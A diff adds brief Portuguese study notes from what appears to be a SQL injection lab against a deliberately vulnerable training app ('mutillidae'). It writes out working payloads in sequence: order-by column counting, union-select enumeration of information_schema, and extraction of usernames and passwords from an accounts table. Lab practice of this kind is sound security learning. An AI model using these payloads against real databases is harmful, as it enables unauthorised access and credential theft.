@@ -1,0 +1,29 @@
+SQL INJECTION (POST SELECT)
+
+FORMAS DE EXPLORAÇÃO:
+1 - CÓDIGO FONTE
+2 - BURPSUITE
+
+VAMOS FAZER A MODIFICAÇÃO E INJEÇÃO PELO CÓDIGO FONTE.
+
+Verificando injeção:
+<option value="1'">G.I. Joe: Retaliation</option>
+    |-> Retorna erro:
+    |-> OBS: Precisamos fazer a modificação e escolher o input que mudamos e clicar em Go.
+
+Fazendo Injeção:
+<option value="1 order by 7#">G.I. Joe: Retaliation</option>
+    |-> Esse sql não precisamos utilizar ' aspas para fazer o union e orders.
+        |-> Caso coloquemos retorna:  '' order by 7#'
+            |-> A aplicação retorna aspas a mais.
+
+Com isso precisamos passar um - para que os dados sejam retornados.
+
+<option value="1 order by 7#">G.I. Joe: Retaliation</option>
+<option value="-1 union select 1,database(),3,4,5,6,7#">G.I. Joe: Retaliation</option>
+
+Agora vamos realizar os próximos passos no burpsuite.
+
+-1 union select 1,table_name,table_schema,4,5,6,7 from information_schema.tables#"
+-1 union select 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema="mutillidae" AND table_name="accounts"#
+-1 union select 1,username,password,4,5,6,7 from mutillidae.accounts#
